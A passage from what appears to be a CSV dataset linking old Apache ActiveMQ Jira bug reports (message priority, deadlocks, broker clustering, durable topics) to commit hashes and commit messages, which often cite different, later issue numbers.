 followed by an 'S' with a priority of 2.  Only difference from
scenario 1 is that priorities have been assigned to messages.  Now the
consumer cannot receive any messages ¡V it blocks until we add a
consumer that consumes the 'N' type message.  This behavior seems to be a bug.


--
This message is automatica",e085ed4d5f9704b42ebb2065bd45674af43f623d,"https://issues.apache.org/jira/browse/AMQ-3378 - isSlowConsumer for SubscriptionView

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1140098 13f79535-47bb-0310-9956-ffa450edef68"
12481504,AMQ-337,"This is re-submission of bug AMQ-334, since the link to AMQ-334 is broken on Jira.
 
A message consumer will not receive message that matches its message selector definition, until all other messages with higher priority have been consumerd from the queue.

For example, say our messages have a property which can have one of two values - 'S' and 'N'. We have a queue where, at the moment, there is only one consumer, who is set up to consume only 'S' messages.  We've tested
this with two scenarios:
1)       Place an 'N' message in the queue, followed by an 'S'.  No
priority is assigned to the messages.  The consumer is able to receive
the 'S' message, even though the 'N' message is ahead of it in the
queue.  This is the behavior that we find logical.

2)       Place an 'N' message in the queue with a priority of 4,
 followed by an 'S' with a priority of 2.  Only difference from
scenario 1 is that priorities have been assigned to messages.  Now the
consumer cannot receive any messages ¡V it blocks until we add a
consumer that consumes the 'N' type message.  This behavior seems to be a bug.


--
This message is automatica",f7988655d3fbf57f290f8f8cbc25c15dc65e3b37,"https://issues.apache.org/jira/browse/AMQ-3379 - unique property eviction strategy

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1140531 13f79535-47bb-0310-9956-ffa450edef68"
12481504,AMQ-337,"This is re-submission of bug AMQ-334, since the link to AMQ-334 is broken on Jira.
 
A message consumer will not receive message that matches its message selector definition, until all other messages with higher priority have been consumerd from the queue.

For example, say our messages have a property which can have one of two values - 'S' and 'N'. We have a queue where, at the moment, there is only one consumer, who is set up to consume only 'S' messages.  We've tested
this with two scenarios:
1)       Place an 'N' message in the queue, followed by an 'S'.  No
priority is assigned to the messages.  The consumer is able to receive
the 'S' message, even though the 'N' message is ahead of it in the
queue.  This is the behavior that we find logical.

2)       Place an 'N' message in the queue with a priority of 4,
 followed by an 'S' with a priority of 2.  Only difference from
scenario 1 is that priorities have been assigned to messages.  Now the
consumer cannot receive any messages ¡V it blocks until we add a
consumer that consumes the 'N' type message.  This behavior seems to be a bug.


--
This message is automatica",fa2b058dd52fb447b893512dfbb5eb370c456926,"https://issues.apache.org/jira/browse/AMQ-3375: stomp consumer might not receive all msgs of a virtual topic queue with memory limits. Committing tims test case which works fine post resolution of https://issues.apache.org/jira/browse/AMQ-3434

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1153463 13f79535-47bb-0310-9956-ffa450edef68"
12481572,AMQ-334,"A message consumer will not receive message that matches its message selector definition, until all other messages with higher priority have been consumerd from the queue.  

For example, say our messages have a property which can have one of two values - 'S' and 'N'. We have a queue where, at the moment, there is only one consumer, who is set up to consume only 'S' messages.  We've tested
this with two scenarios: 
1)       Place an 'N' message in the queue, followed by an 'S'.  No
priority is assigned to the messages.  The consumer is able to receive
the 'S' message, even though the 'N' message is ahead of it in the
queue.  This is the behavior that we find logical.

2)       Place an 'N' message in the queue with a priority of 4,
 followed by an 'S' with a priority of 2.  Only difference from
scenario 1 is that priorities have been assigned to messages.  Now the
consumer cannot receive any messages ¡V it blocks until we add a
consumer that consumes the 'N' type message.  This behavior seems to be a bug. 
",6fefadb620421c74547fe34e2e0209ec1fdde983,"https://issues.apache.org/jira/browse/AMQ-3341 - reseting destination map

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1129741 13f79535-47bb-0310-9956-ffa450edef68"
12481572,AMQ-334,"A message consumer will not receive message that matches its message selector definition, until all other messages with higher priority have been consumerd from the queue.  

For example, say our messages have a property which can have one of two values - 'S' and 'N'. We have a queue where, at the moment, there is only one consumer, who is set up to consume only 'S' messages.  We've tested
this with two scenarios: 
1)       Place an 'N' message in the queue, followed by an 'S'.  No
priority is assigned to the messages.  The consumer is able to receive
the 'S' message, even though the 'N' message is ahead of it in the
queue.  This is the behavior that we find logical.

2)       Place an 'N' message in the queue with a priority of 4,
 followed by an 'S' with a priority of 2.  Only difference from
scenario 1 is that priorities have been assigned to messages.  Now the
consumer cannot receive any messages ¡V it blocks until we add a
consumer that consumes the 'N' type message.  This behavior seems to be a bug. 
",0601fb71186e330cbae4641ccdbaa44df6ae1b94,"https://issues.apache.org/jira/browse/AMQ-3348 - network connector restart

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1130441 13f79535-47bb-0310-9956-ffa450edef68"
12481572,AMQ-334,"A message consumer will not receive message that matches its message selector definition, until all other messages with higher priority have been consumerd from the queue.  

For example, say our messages have a property which can have one of two values - 'S' and 'N'. We have a queue where, at the moment, there is only one consumer, who is set up to consume only 'S' messages.  We've tested
this with two scenarios: 
1)       Place an 'N' message in the queue, followed by an 'S'.  No
priority is assigned to the messages.  The consumer is able to receive
the 'S' message, even though the 'N' message is ahead of it in the
queue.  This is the behavior that we find logical.

2)       Place an 'N' message in the queue with a priority of 4,
 followed by an 'S' with a priority of 2.  Only difference from
scenario 1 is that priorities have been assigned to messages.  Now the
consumer cannot receive any messages ¡V it blocks until we add a
consumer that consumes the 'N' type message.  This behavior seems to be a bug. 
",27e6dd7e8cfb88fcffba07440d1febd96df9f9b6,"https://issues.apache.org/jira/browse/AMQ-3347 - network connector restart/re-add

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1130469 13f79535-47bb-0310-9956-ffa450edef68"
12481406,AMQ-328,"Using a topic requestor with requestor on one first broker and replier on second broker.  First reply message seems to work, but second is stopped prior to return across the bridge. ",d822db72f34652335f299c631d6f1ed601f16282,"https://issues.apache.org/jira/browse/AMQ-3280 - adding a test case

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1092070 13f79535-47bb-0310-9956-ffa450edef68"
12481406,AMQ-328,"Using a topic requestor with requestor on one first broker and replier on second broker.  First reply message seems to work, but second is stopped prior to return across the bridge. ",459be2d0fbdc790a379b1a8e7ec4dccbcdd821d7,"https://issues.apache.org/jira/browse/AMQ-3283 - transaction support for perf plugin

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1092753 13f79535-47bb-0310-9956-ffa450edef68"
12481406,AMQ-328,"Using a topic requestor with requestor on one first broker and replier on second broker.  First reply message seems to work, but second is stopped prior to return across the bridge. ",7539c7e9753fffddeb07042bf288512131989ddd,"https://issues.apache.org/jira/browse/AMQ-3289 - fix missing dummy arg for blob in initial insert

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1140872 13f79535-47bb-0310-9956-ffa450edef68"
12481404,AMQ-326,Have seen cases where the delivery can be delayed by minutes.  This was happening in single broker configuration.  ,1760d1aefb6d85799fc6d5ab0b13d6bb70e8f220,"https://issues.apache.org/jira/browse/AMQ-3262 - queue browser and message order

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1088593 13f79535-47bb-0310-9956-ffa450edef68"
12481040,AMQ-317,"I've been writing some quick test benchmarks and ran across a race condition that causes the DurableQueueBoundedMessageManager.add/removeMessageConsumer to deadlock.  relavent parts of the stack trace:


""Thread-15"" daemon prio=5 tid=0x0053ff80 nid=0x19dfc00 waiting for monitor entry [f1010000..f1010ac0]
        at org.activemq.service.boundedvm.DurableQueueBoundedMessageContainer.removeConsumer(DurableQueueBoundedMessageContainer.java:152)
        - waiting to lock <0x4c9a7048> (a java.lang.Object)
        at org.activemq.service.boundedvm.DurableQueueBoundedMessageManager.removeMessageConsumer(DurableQueueBoundedMessageManager.java:265)
        - locked <0x4c999048> (a org.activemq.service.boundedvm.DurableQueueBoundedMessageManager)
        at org.activemq.broker.impl.DefaultBroker.removeMessageConsumer(DefaultBroker.java:265)
        at org.activemq.broker.impl.BrokerContainerImpl.deregisterMessageConsumer(BrokerContainerImpl.java:367)
        at org.activemq.broker.impl.BrokerConnectorImpl.deregisterMessageConsumer(BrokerConnectorImpl.java:182)
        at org.activemq.broker.impl.BrokerClientImpl.cleanUp(BrokerClientImpl.java:619)
        - locked <0x4caa47a8> (a org.activemq.broker.impl.BrokerClientImpl)
        at org.activemq.broker.impl.BrokerConnectorImpl.removeClient(BrokerConnectorImpl.java:327)
        at org.activemq.transport.TransportChannelSupport.stop(TransportChannelSupport.java:119)
        at org.activemq.transport.tcp.TcpTransportChannel.stop(TcpTransportChannel.java:215)
        at org.activemq.broker.impl.BrokerClientImpl.close(BrokerClientImpl.java:710)
        at org.activemq.broker.impl.BrokerClientImpl.onException(BrokerClientImpl.java:146)
        at org.activemq.transport.TransportChannelSupport.onAsyncException(TransportChannelSupport.java:445)
        at org.activemq.transport.tcp.TcpTransportChannel.doAsyncSend(TcpTransportChannel.java:480)
        at org.activemq.transport.tcp.TcpTransportChannel$1.run(TcpTransportChannel.java:258)
        at EDU.oswego.cs.dl.util.concurrent.PooledExecutor$Worker.run(Unknown Source)
        at java.lang.Thread.run(Thread.java:552)

""Durable Queue Worker"" daemon prio=6 tid=0x00526320 nid=0x19c8a00 in Object.wait() [f0f0e000..f0f0eac0]
        at java.lang.Object.wait(Native Method)
        at java.lang.Object.wait(Object.java:429)
        at EDU.oswego.cs.dl.util.concurrent.BoundedBuffer.put(Unknown Source)
        - locked <0x4caa46f8> (a java.lang.Object)
        at EDU.oswego.cs.dl.util.concurrent.PooledExecutor$WaitWhenBlocked.blockedAction(Unknown Source)
        at EDU.oswego.cs.dl.util.concurrent.PooledExecutor.execute(Unknown Source)
        at org.activemq.transport.tcp.TcpTransportChannel.asyncSend(TcpTransportChannel.java:254)
        at org.activemq.broker.impl.BrokerClientImpl.send(BrokerClientImpl.java:676)
        at org.activemq.broker.impl.BrokerClientImpl.dispatchToClient(BrokerClientImpl.java:221)
        at org.activemq.broker.impl.BrokerClientImpl.dispatch(BrokerClientImpl.java:166)
        at org.activemq.service.boundedvm.DurableQueueSubscription.doDispatch(DurableQueueSubscription.java:93)
        at org.activemq.service.boundedvm.DurableQueueBoundedMessageContainer.run(DurableQueueBoundedMessageContainer.java:326)
        - locked <0x4c9a7048> (a java.lang.Object)
        - locked <0x4c9a7050> (a java.lang.Object)
        at EDU.oswego.cs.dl.util.concurrent.PooledExecutor$Worker.run(Unknown Source)
        at java.lang.Thread.run(Thread.java:552)


subsequent attempts to addConsumers will also hang until the server broker is killed and restarted

the code that causes this to happen is as follows:

          final long[] received = new long[1];

        Connection connection = connectionFactory.createConnection();
        Session session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);
        Destination destination = new ActiveMQQueue(""testQueue"");
        MessageConsumer consumer = session.createConsumer(destination);
        consumer.setMessageListener(new MessageListener() {
            public void onMessage(Message message) {
                synchronized(received) {
                    received[0]++;
                }
            }
        });
        connection.start();

        final int total = 1000000;


        new Thread(new Runnable() {
            public void run() {
                for(int i=0;i<total;i++) {
                    template.convertAndSend(""testQueue"", ""test message"");
                }
            }
        }).start();

        long last = 0;
        long cur = 0;

        do {
            synchronized(received) {
                cur = received[0];
            }
            System.out.println(""received = "" + cur + "" diff = "" + (cur - last));
            last = cur;
            Thread.sleep(1000);
        } while(cur < total);


(the template object is just a normal spring JmsTemplate configured in the app context in the test client)

If I run the above code and stop/kill/interupt the process while its still sending messages the server broker will go into this deadlock about 1 out of every 3 tries in my test setup, otherwise it just spits out an IOException and removes the messageConsumer just fine

",47b56311a46e9b53b0a2267926279aa9fb9971a0,"https://issues.apache.org/jira/browse/AMQ-3177 - slf4j use in perf plugin

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1069736 13f79535-47bb-0310-9956-ffa450edef68"
12481388,AMQ-316,"The documention section on ""How do distributed queues work"" states:

Note that messages are only distributed onto other brokers if there is a consumer on those brokers.

However using the ""CommandTrace"" logging category is showing a different story.  I have two networked brokers.  I connect all clients only to broker A.  But tailing of the log on broker B shows all the Topic traffic between clients on broker A are being sent across the network bridge (there is a broker received msg) entry for all activity on broker A).

",cfdd68c79983eff4ed2b1a8850bb536cf08cefc9,"https://issues.apache.org/jira/browse/AMQ-3167 - add test case from Arthur with thanks.

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1069813 13f79535-47bb-0310-9956-ffa450edef68"
12481388,AMQ-316,"The documention section on ""How do distributed queues work"" states:

Note that messages are only distributed onto other brokers if there is a consumer on those brokers.

However using the ""CommandTrace"" logging category is showing a different story.  I have two networked brokers.  I connect all clients only to broker A.  But tailing of the log on broker B shows all the Topic traffic between clients on broker A are being sent across the network bridge (there is a broker received msg) entry for all activity on broker A).

",c0c92595fd9e5ab8eca74b33e34e066465f8fc6f,"https://issues.apache.org/jira/browse/AMQ-3168 - use boolean editor for createConnector property, to avoid problems with schema validation

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1201662 13f79535-47bb-0310-9956-ffa450edef68"
12481388,AMQ-316,"The documention section on ""How do distributed queues work"" states:

Note that messages are only distributed onto other brokers if there is a consumer on those brokers.

However using the ""CommandTrace"" logging category is showing a different story.  I have two networked brokers.  I connect all clients only to broker A.  But tailing of the log on broker B shows all the Topic traffic between clients on broker A are being sent across the network bridge (there is a broker received msg) entry for all activity on broker A).

",1462fd234c98037992cdb78b77e9ddde808efa83,"https://issues.apache.org/jira/browse/AMQ-3168 - use boolean editor for most used broker service boolean properties

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1201666 13f79535-47bb-0310-9956-ffa450edef68"
12481297,AMQ-313,"While looking for another problem I pulled a Full Thread dump on the broker.  I found several dozen threads
with the following stack trace and they look very troublesome to me. If an error occurs on an async send, 
due to a broken client connection, the close is failing in such a manner as to lock up the pooled thread.

This looks to me like there could be some sort of bug in the concurrent-1.3.4.jar library code.  
""Thread-292"" daemon prio=1 tid=0x085b6008 nid=0x6663 in Object.wait() [5cd59000..5cd59cd8]
        at java.lang.Object.wait(Native Method)
        - waiting on <0x47eb41c0> (a EDU.oswego.cs.dl.util.concurrent.PooledExecutor)
        at java.lang.Object.wait(Object.java:429)
        at EDU.oswego.cs.dl.util.concurrent.PooledExecutor.awaitTerminationAfterShutdown(Unknown Source)
        - locked <0x47eb41c0> (a EDU.oswego.cs.dl.util.concurrent.PooledExecutor)
        at org.activemq.util.ExecutorHelper.stopExecutor(ExecutorHelper.java:50)
        at org.activemq.transport.TransportChannelSupport.stopExecutor(TransportChannelSupport.java:487)
        at org.activemq.transport.tcp.TcpTransportChannel.stop(TcpTransportChannel.java:218)
        at org.activemq.broker.impl.BrokerClientImpl.close(BrokerClientImpl.java:694)
        at org.activemq.broker.impl.BrokerClientImpl.onException(BrokerClientImpl.java:137)
        at org.activemq.transport.TransportChannelSupport.onAsyncException(TransportChannelSupport.java:445)
        at org.activemq.transport.tcp.TcpTransportChannel.doAsyncSend(TcpTransportChannel.java:489)
        at org.activemq.transport.tcp.TcpTransportChannel$1.run(TcpTransportChannel.java:261)
        at EDU.oswego.cs.dl.util.concurrent.PooledExecutor$Worker.run(Unknown Source)
        at java.lang.Thread.run(Thread.java:534)
 
",14d5dcee8c55632d6099e1e86ef627a5c3d98c74,"https://issues.apache.org/jira/browse/AMQ-3134 - Add support of MS SQL JDBC driver (version 3.0) 

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1058582 13f79535-47bb-0310-9956-ffa450edef68"
12481297,AMQ-313,"While looking for another problem I pulled a Full Thread dump on the broker.  I found several dozen threads
with the following stack trace and they look very troublesome to me. If an error occurs on an async send, 
due to a broken client connection, the close is failing in such a manner as to lock up the pooled thread.

This looks to me like there could be some sort of bug in the concurrent-1.3.4.jar library code.  
""Thread-292"" daemon prio=1 tid=0x085b6008 nid=0x6663 in Object.wait() [5cd59000..5cd59cd8]
        at java.lang.Object.wait(Native Method)
        - waiting on <0x47eb41c0> (a EDU.oswego.cs.dl.util.concurrent.PooledExecutor)
        at java.lang.Object.wait(Object.java:429)
        at EDU.oswego.cs.dl.util.concurrent.PooledExecutor.awaitTerminationAfterShutdown(Unknown Source)
        - locked <0x47eb41c0> (a EDU.oswego.cs.dl.util.concurrent.PooledExecutor)
        at org.activemq.util.ExecutorHelper.stopExecutor(ExecutorHelper.java:50)
        at org.activemq.transport.TransportChannelSupport.stopExecutor(TransportChannelSupport.java:487)
        at org.activemq.transport.tcp.TcpTransportChannel.stop(TcpTransportChannel.java:218)
        at org.activemq.broker.impl.BrokerClientImpl.close(BrokerClientImpl.java:694)
        at org.activemq.broker.impl.BrokerClientImpl.onException(BrokerClientImpl.java:137)
        at org.activemq.transport.TransportChannelSupport.onAsyncException(TransportChannelSupport.java:445)
        at org.activemq.transport.tcp.TcpTransportChannel.doAsyncSend(TcpTransportChannel.java:489)
        at org.activemq.transport.tcp.TcpTransportChannel$1.run(TcpTransportChannel.java:261)
        at EDU.oswego.cs.dl.util.concurrent.PooledExecutor$Worker.run(Unknown Source)
        at java.lang.Thread.run(Thread.java:534)
 
",b5579ac1caf331f494b5d2f1b7b557f7546e1b23,"https://issues.apache.org/jira/browse/AMQ-3135 - add remote address to connection info advisory

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1103673 13f79535-47bb-0310-9956-ffa450edef68"
12481297,AMQ-313,"While looking for another problem I pulled a Full Thread dump on the broker.  I found several dozen threads
with the following stack trace and they look very troublesome to me. If an error occurs on an async send, 
due to a broken client connection, the close is failing in such a manner as to lock up the pooled thread.

This looks to me like there could be some sort of bug in the concurrent-1.3.4.jar library code.  
""Thread-292"" daemon prio=1 tid=0x085b6008 nid=0x6663 in Object.wait() [5cd59000..5cd59cd8]
        at java.lang.Object.wait(Native Method)
        - waiting on <0x47eb41c0> (a EDU.oswego.cs.dl.util.concurrent.PooledExecutor)
        at java.lang.Object.wait(Object.java:429)
        at EDU.oswego.cs.dl.util.concurrent.PooledExecutor.awaitTerminationAfterShutdown(Unknown Source)
        - locked <0x47eb41c0> (a EDU.oswego.cs.dl.util.concurrent.PooledExecutor)
        at org.activemq.util.ExecutorHelper.stopExecutor(ExecutorHelper.java:50)
        at org.activemq.transport.TransportChannelSupport.stopExecutor(TransportChannelSupport.java:487)
        at org.activemq.transport.tcp.TcpTransportChannel.stop(TcpTransportChannel.java:218)
        at org.activemq.broker.impl.BrokerClientImpl.close(BrokerClientImpl.java:694)
        at org.activemq.broker.impl.BrokerClientImpl.onException(BrokerClientImpl.java:137)
        at org.activemq.transport.TransportChannelSupport.onAsyncException(TransportChannelSupport.java:445)
        at org.activemq.transport.tcp.TcpTransportChannel.doAsyncSend(TcpTransportChannel.java:489)
        at org.activemq.transport.tcp.TcpTransportChannel$1.run(TcpTransportChannel.java:261)
        at EDU.oswego.cs.dl.util.concurrent.PooledExecutor$Worker.run(Unknown Source)
        at java.lang.Thread.run(Thread.java:534)
 
",7880521a1d4de183abc1ee55e2ff32a4205434f4,"https://issues.apache.org/jira/browse/AMQ-3135 - replay network bridge advisories for new consumers

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1146717 13f79535-47bb-0310-9956-ffa450edef68"
12481104,AMQ-298,"When journal log files grew past thier prefered size and then rolledover, they were not being resized to the prefered size.",51ef021073752f2cf8907fa0efdf8c93015dd77b,"https://issues.apache.org/activemq/browse/AMQ-2986 - JMX and store percent usage

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1023795 13f79535-47bb-0310-9956-ffa450edef68"
12481104,AMQ-298,"When journal log files grew past thier prefered size and then rolledover, they were not being resized to the prefered size.",6ebc82c5c47e46479289b756514e0af44ff385b7,"https://issues.apache.org/activemq/browse/AMQ-2982 - sticky kahadb log files on rollback

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1027451 13f79535-47bb-0310-9956-ffa450edef68"
12481104,AMQ-298,"When journal log files grew past thier prefered size and then rolledover, they were not being resized to the prefered size.",5ad72d650cce2d09881f4b7f0cf1eebdb79c4a7a,"https://issues.apache.org/jira/browse/AMQ-2981 - test case for discory uri with params

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1075407 13f79535-47bb-0310-9956-ffa450edef68"
12481141,AMQ-293,"When using async sends in j2ee container, the broker sometimes would see exceptions saying that the XID had not been started yet.",5edede1d0bae76510e42a16f8381570ad26fbfda,"partial fix for https://issues.apache.org/activemq/browse/AMQ-2939 - allow the management context port values to be properties by ensuring that their schema is of type string rather than integer

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1028278 13f79535-47bb-0310-9956-ffa450edef68"
12481088,AMQ-292,[TransportChannelSupport] No Packet found to match Receipt correlationId: 6,acb8164bc619ebcc2007b7094d5d926b1dafc197,"https://issues.apache.org/activemq/browse/AMQ-2927 - test case in the making

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@999814 13f79535-47bb-0310-9956-ffa450edef68"
12481088,AMQ-292,[TransportChannelSupport] No Packet found to match Receipt correlationId: 6,b895efce021677322165835b3f509b44c317a0ed,"Revert part of the fix for https://issues.apache.org/jira/browse/AMQ-2922 that removed the xbean element annotation.

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1148072 13f79535-47bb-0310-9956-ffa450edef68"
12481065,AMQ-291,[TransportChannelSupport] No Packet found to match Receipt correlationId: 6,6672740da0a4c9c5d6b084614f390e5d0539ada4,"fix for: https://issues.apache.org/activemq/browse/AMQ-2915

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@996646 13f79535-47bb-0310-9956-ffa450edef68"
12481133,AMQ-289,"org.activemq.test.RollbackTest has the test case from Deepak Nayal.

",bea9f68d9a11483b6a280cbcf6026c1f7c050180,"AMQ-2896 - configure maven-eclipse-plugin so it doesn't try and get a 2.8-SNAPSHOT version that doesn't exist

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@991936 13f79535-47bb-0310-9956-ffa450edef68"
12481133,AMQ-289,"org.activemq.test.RollbackTest has the test case from Deepak Nayal.

",db5ba04cd2c9c60a794ef356db3ff913ca98cb06,"https://issues.apache.org/activemq/browse/AMQ-2891 - add some progress info messages for cursor recovery, kicks in a 50000 messages

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@992241 13f79535-47bb-0310-9956-ffa450edef68"
12481133,AMQ-289,"org.activemq.test.RollbackTest has the test case from Deepak Nayal.

",f2816deb1c90ac45df4fa66ae4c7d6ef44ed4d6a,"fix hanging test that did not stop broker in shutdown, schedualler on startup shows it up: https://issues.apache.org/activemq/browse/AMQ-2897

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@996962 13f79535-47bb-0310-9956-ffa450edef68"
12481133,AMQ-289,"org.activemq.test.RollbackTest has the test case from Deepak Nayal.

",487834164ce0452c8624b86571950f33531114d8,"resolve another hanging test, broker names need to be added to differenciat sehadualler stores: https://issues.apache.org/activemq/browse/AMQ-2897

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@997225 13f79535-47bb-0310-9956-ffa450edef68"
12481133,AMQ-289,"org.activemq.test.RollbackTest has the test case from Deepak Nayal.

",5bf3696c81dd8f2f542cf3dd9ed588c24f095df4,"resolve another hanging test, broker not stopped on teardown: https://issues.apache.org/activemq/browse/AMQ-2897

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@997250 13f79535-47bb-0310-9956-ffa450edef68"
12481278,AMQ-284,Advisory messages should not be persisted to avoid performance degregation.,03f38ae402511f664c36b5415703f887739e921a,"https://issues.apache.org/activemq/browse/AMQ-2843 - add mechanism for stores to know whether to use prioritized recovery or not

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@966145 13f79535-47bb-0310-9956-ffa450edef68"
12481199,AMQ-282,"Bug can be verified with the shipped examples.  To reproduce:

1. Start broker
2. ant -Dtopic=true -Ddurable=true consumer
3. Restart broker
4. ant -Dtopic=true -Ddurable=true producer
5. ant -Dtopic=true -Ddurable=true consumer

At step 5 I would expect the produced messages to be received but are not.
",70314ea8a68cc6600730a659e58a4b01cfbdef75,"Fix for https://issues.apache.org/activemq/browse/AMQ-2821

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@963096 13f79535-47bb-0310-9956-ffa450edef68"
12481199,AMQ-282,"Bug can be verified with the shipped examples.  To reproduce:

1. Start broker
2. ant -Dtopic=true -Ddurable=true consumer
3. Restart broker
4. ant -Dtopic=true -Ddurable=true producer
5. ant -Dtopic=true -Ddurable=true consumer

At step 5 I would expect the produced messages to be received but are not.
",f772e5f8c7edb9b3d3fd895304bdf35ca251d103,"https://issues.apache.org/activemq/browse/AMQ-2827 - test case

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@994978 13f79535-47bb-0310-9956-ffa450edef68"
12481209,AMQ-281,"I configured clustering between 2 brokers (I called them alpha and beta).  To configure clustering I added the following into the activemq.xml file:

    <discoveryAgent>
      <zeroconfDiscovery type=""_activemq.broker.development.""/>
    </discoveryAgent>
    <discoveryNetworkConnector/>

When I start the brokers up, clustering seems fine, as both brokers successfully join the cluster, and I'm able to use the example producer/consumer to send/receive from either of the brokers. 

However, when I shutdown one of the brokers via kill (in this test run I killed beta), the remaining broker gets into a bad state, and ends up logging approximately 80 megs worth of this stack trace:

2005-06-27 14:34:38,203 [localport=1322]] WARN  ActiveMQConnection             - Async exception with no exception listener: javax.jms.JMSException: asyncSend failed: java.net.SocketException: Connection reset by peer: socket write error
javax.jms.JMSException: asyncSend failed: java.net.SocketException: Connection reset by peer: socket write error
	at org.activemq.util.JMSExceptionHelper.newJMSException(JMSExceptionHelper.java:49)
	at org.activemq.transport.tcp.TcpTransportChannel.doAsyncSend(TcpTransportChannel.java:479)
	at org.activemq.transport.tcp.TcpTransportChannel.asyncSend(TcpTransportChannel.java:286)
	at org.activemq.ActiveMQConnection.asyncSendPacket(ActiveMQConnection.java:1190)
	at org.activemq.ActiveMQConnection.asyncSendPacket(ActiveMQConnection.java:1167)
	at org.activemq.ActiveMQConnection.sendConnectionInfoToBroker(ActiveMQConnection.java:1452)
	at org.activemq.ActiveMQConnection.close(ActiveMQConnection.java:757)
	at org.activemq.ActiveMQConnection.onException(ActiveMQConnection.java:982)
	at org.activemq.transport.TransportChannelSupport.onAsyncException(TransportChannelSupport.java:445)
	at org.activemq.transport.tcp.TcpTransportChannel.doAsyncSend(TcpTransportChannel.java:480)
	at org.activemq.transport.tcp.TcpTransportChannel.asyncSend(TcpTransportChannel.java:286)
	at org.activemq.ActiveMQConnection.asyncSendPacket(ActiveMQConnection.java:1190)
	at org.activemq.ActiveMQConnection.asyncSendPacket(ActiveMQConnection.java:1167)
	at org.activemq.ActiveMQConnection.sendConnectionInfoToBroker(ActiveMQConnection.java:1452)
	at org.activemq.ActiveMQConnection.close(ActiveMQConnection.java:757)
	at org.activemq.ActiveMQConnection.onException(ActiveMQConnection.java:982)
	at org.activemq.transport.TransportChannelSupport.onAsyncException(TransportChannelSupport.java:445)
	at org.activemq.transport.tcp.TcpTransportChannel.doAsyncSend(TcpTransportChannel.java:480)
	at org.activemq.transport.tcp.TcpTransportChannel.asyncSend(TcpTransportChannel.java:286)
	at org.activemq.ActiveMQConnection.asyncSendPacket(ActiveMQConnection.java:1190)
	at org.activemq.ActiveMQConnection.asyncSendPacket(ActiveMQConnection.java:1167)
	at org.activemq.ActiveMQConnection.sendConnectionInfoToBroker(ActiveMQConnection.java:1452)
	at org.activemq.ActiveMQConnection.close(ActiveMQConnection.java:757)
	at org.activemq.ActiveMQConnection.onException(ActiveMQConnection.java:982)
	at org.activemq.transport.TransportChannelSupport.onAsyncException(TransportChannelSupport.java:445)
	at org.activemq.transport.tcp.TcpTransportChannel.doClose(TcpTransportChannel.java:509)
	at org.activemq.transport.tcp.TcpTransportChannel.run(TcpTransportChannel.java:326)
	at java.lang.Thread.run(Thread.java:595)
Caused by: java.net.SocketException: Connection reset by peer: socket write error
	at java.net.SocketOutputStream.socketWrite0(Native Method)
	at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:92)
	at java.net.SocketOutputStream.write(SocketOutputStream.java:136)
	at org.activemq.transport.tcp.TcpBufferedOutputStream.flush(TcpBufferedOutputStream.java:109)
	at java.io.DataOutputStream.flush(DataOutputStream.java:106)
	at org.activemq.transport.tcp.TcpTransportChannel.doAsyncSend(TcpTransportChannel.java:471)
	... 26 more

After restarting the beta broker I just killed, it seems to join the cluster properly, but as soon as I connect the consumer example to the alpha broker, the alpha proceeds to log another 80 megs worth of the same exceptions.",03349fecda8efde730b100ed338c0cfe2171d462,"https://issues.apache.org/activemq/browse/AMQ-2817 - prevent test from failing

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@963678 13f79535-47bb-0310-9956-ffa450edef68"
12481167,AMQ-280,"Looks like the queue managers never trigger garbage collection because...

   this.doingGarbageCollection = new SynchronizedBoolean(false);

   private void doGarbageCollection() {
       if (doingGarbageCollection.commit(true, false)) { // this always evaluates to false, right?
            ...
       }
   }

Should this rather be?

   private void doGarbageCollection() {
       if (doingGarbageCollection.commit(false, true)) {
            ...
       }
   }

This is applicable to both TransientQueueBoundedMessageManager and DurableQueueBoundedMessageManager.",3a181501b1814beb758b1feea690cb9062dc2b62,"test for: https://issues.apache.org/jira/browse/AMQ-2801

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1154258 13f79535-47bb-0310-9956-ffa450edef68"
12481308,AMQ-278,"I wanted to try out jgroups protocol located in sandbox.

The hierarchy has not been changed from org.codehaus to org.activemq thus the transport factory is unable to pickup the classes:

/META-INF/services/org/codehaus/activemq/* -> /META-INF/services/org/activemq/* ",97032199728567b0ea70f33c0bfedd96e420b0ac,"https://issues.apache.org/activemq/browse/AMQ-2782 - test case

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@955505 13f79535-47bb-0310-9956-ffa450edef68"
12481309,AMQ-277,"Multicast transport is broken in AMQ certainly due to ack problems. Messages are sent over and over, completely flooding the network.

The behavior can be easily shown using the ProducerTool and ConsumerTool (in examples/src)
Using the following command lines:

